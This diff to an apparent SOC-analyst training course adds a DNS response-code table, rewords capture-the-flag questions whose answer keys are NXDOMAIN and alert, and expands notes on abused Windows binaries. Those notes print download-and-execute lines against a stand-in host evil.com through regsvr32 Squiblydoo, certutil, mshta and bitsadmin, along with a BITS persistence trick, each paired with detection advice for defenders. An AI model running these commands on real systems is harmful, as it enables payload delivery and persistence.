@@ -611,6 +611,17 @@ A DNS zone is not just a list of "name to IP" mappings — it holds several diff
 
 The two you will lean on most in day-to-day investigation are **A/AAAA** (what IP did this suspicious domain point to?) and **TXT** (is the email security posture — SPF/DKIM/DMARC — actually configured, or can anyone spoof this domain?).
 
+**DNS Response Codes**
+
+Every DNS answer carries a **response code** (RCODE) — a number in the DNS header that DNS logs usually show by its name. The four you will see constantly (defined in RFC 1035):
+
+| Name | RCODE | Meaning | What it tells an analyst |
+|---|---|---|---|
+| NOERROR | 0 | The query succeeded | The domain exists — check what IP it resolved to |
+| SERVFAIL | 2 | The server failed to complete the lookup | Often a broken or misconfigured domain; a spike can indicate resolver trouble |
+| NXDOMAIN | 3 | Non-existent domain — the name is not registered | One is a typo; hundreds from one host in minutes is a classic DGA malware pattern |
+| REFUSED | 5 | The server refused to answer (policy) | A client asking a server it is not allowed to use |
+
 **DNS Security Threats:**
 - **DNS cache poisoning:** Attacker injects fake DNS responses so your DNS cache stores wrong IP addresses (you type "bank.com" and get sent to a fake site)
 - **DNS tunneling:** Attackers encode data inside DNS queries/responses to exfiltrate data or communicate with malware — DNS is often not blocked by firewalls, making it attractive for covert channels
@@ -902,9 +913,9 @@ These questions form the foundation of network-based threat investigation.`,
         type: "flag" as const,
         id: "net-prot-f1",
         prompt:
-          "In the DNS log above, what DNS response status did the server return for the suspicious domain query 'xk3r9qlpmf7wz2.com'? Enter the exact status name (rcode).",
+          "In the DNS log above, what DNS response did the server return for the suspicious domain query 'xk3r9qlpmf7wz2.com'? Enter the response as it is named in the log.",
         answer: "NXDOMAIN",
-        hint: "Look at the dns_response field in the raw log data. NXDOMAIN means 'Non-Existent Domain.'",
+        hint: "Look at the dns_response field in the raw log data. This response means the domain that was queried does not exist — which is exactly what you would expect for most randomly generated domains.",
         xp: 25,
       },
       {
@@ -1312,9 +1323,9 @@ A **proxy server** acts as an intermediary between clients and servers. Two type
         type: "flag" as const,
         id: "fw-f1",
         prompt:
-          "In the port scan IDS alert above, what was the value of the 'action' field? This tells you what the IDS did when it detected the scan (hint: it's one word and tells you the IDS only detected but did not block).",
+          "In the port scan IDS alert above, what was the value of the 'action' field? This tells you what the IDS did when it detected the scan.",
         answer: "alert",
-        hint: "Look in the raw log data for the 'action' field. An IDS generates alerts but does not block — that's the difference between IDS and IPS.",
+        hint: "Look in the raw log data for the 'action' field. Remember the difference between an IDS and an IPS: only one of them can block traffic.",
         xp: 25,
       },
       {
@@ -1617,9 +1628,13 @@ IEX (Invoke-Expression) executes a string as code. This downloads a script from 
 - **certutil.exe:** Legitimate use — certificate management. Attacker use — download files (certutil -urlcache -f http://evil.com/payload.exe), encode/decode Base64
 - **mshta.exe:** Runs HTA (HTML Application) files. Attackers use it to execute malicious HTML/JScript/VBScript (mshta http://evil.com/payload.hta)
 - **rundll32.exe:** Loads and runs DLL files. Legitimate use — Windows internal. Attacker use — execute malicious DLLs, call COM objects
-- **regsvr32.exe:** Registers COM DLLs. Attacker use (Squiblydoo technique): regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll — downloads and executes remote script
+- **regsvr32.exe:** Registers and unregisters COM DLLs (it writes/removes their registry entries) — installers and admins use it legitimately, usually against a local DLL path such as regsvr32 /s C:\\Program Files\\Vendor\\component.dll.
+  - **How it is abused (MITRE ATT&CK T1218.010 — System Binary Proxy Execution: Regsvr32):** the "Squiblydoo" technique — regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll. The /i: switch hands a URL to scrobj.dll, which fetches a remote scriptlet (.sct) and runs its embedded JScript/VBScript in memory. Nothing is actually registered, no admin rights are needed, the binary is Microsoft-signed, and it historically bypassed AppLocker script rules — which is why it is popular for initial execution.
+  - **What to look for:** a process-creation event (Sysmon Event ID 1 or Windows 4688) for regsvr32.exe whose command line contains /i: with http(s):// or a UNC path, or references scrobj.dll; an unusual parent (winword.exe, excel.exe, outlook.exe, wscript.exe, mshta.exe); regsvr32 making an outbound network connection (Sysmon Event ID 3) — legitimate registration never needs the internet; and child processes spawned by regsvr32 (cmd.exe, powershell.exe). Any of these deserves escalation.
 - **wscript.exe / cscript.exe:** Runs VBScript and JScript files. Frequently used to run malicious scripts delivered via email
-- **bitsadmin.exe:** Windows BITS service management. Attacker use — download files using BITS (which may bypass proxies)
+- **bitsadmin.exe:** Command-line manager for BITS (Background Intelligent Transfer Service) — the Windows service that downloads/uploads files in the background using idle bandwidth. Windows Update and many software updaters rely on BITS; bitsadmin itself is deprecated in favour of PowerShell's BITS cmdlets but still ships with Windows.
+  - **How it is abused (MITRE ATT&CK T1197 — BITS Jobs):** downloading tools or payloads (for example bitsadmin /transfer job /download /priority high http://evil.com/a.exe C:\\Users\\Public\\a.exe), because the traffic comes from the trusted BITS service (svchost.exe) rather than from the attacker's process, often looks like normal update traffic, and resumes automatically after reboots or network drops. BITS jobs are also used for **persistence**: a job's notify command (bitsadmin /SetNotifyCmdLine) runs a program when the job completes or fails, and jobs survive reboots — so malware can be re-launched without a Run key or scheduled task.
+  - **What to look for:** process-creation events (Sysmon ID 1 / 4688) for bitsadmin.exe with /transfer, /addfile, /SetNotifyCmdLine or /resume, especially launched by Office, scripts or a user shell; the Microsoft-Windows-Bits-Client/Operational log — Event ID 3 (job created), 59 (transfer started, includes the URL) and 60 (transfer stopped) — with downloads from IP addresses, newly registered domains or file-sharing sites; files written to user-writable paths (C:\\Users\\Public, %TEMP%) that are then executed; and long-lived or unfamiliar jobs listed by bitsadmin /list /allusers /verbose during an investigation.
 - **msiexec.exe:** Installs MSI packages. Attacker use — install malicious packages, load DLLs
 - **wmic.exe:** Windows Management Instrumentation command line. Extremely powerful — can query system information, execute commands, move laterally
 - **forfiles.exe:** Batch processing tool. Attacker use — execute commands indirectly to evade monitoring
